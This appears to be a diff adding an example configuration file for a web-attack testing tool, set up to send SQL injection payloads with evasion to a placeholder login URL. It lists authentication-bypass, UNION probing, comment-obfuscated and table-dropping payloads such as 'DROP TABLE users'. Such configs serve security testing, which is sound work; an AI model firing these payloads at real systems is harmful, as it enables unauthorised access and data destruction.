@@ -1,0 +1,24 @@
+# Advanced SQL Injection Testing Configuration
+# This configuration demonstrates advanced SQLi testing with custom payloads
+
+action: "Send to URL"
+attack_type: "sqli"
+evasion_level: "Advanced"
+
+payload:
+  source: "Enter Manually"
+  custom:
+    - "' OR 1=1 --"
+    - "' UNION SELECT null,version() --"
+    - "'; DROP TABLE users; --"
+    - "admin'/**/OR/**/'1'='1"
+    - "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --"
+
+target:
+  method: "URL"
+  url: "https://example.com/login"
+
+report_type: "JSON"
+
+# Example usage:
+# ./obfuskit -config examples/configs/sqli-advanced-testing.yaml
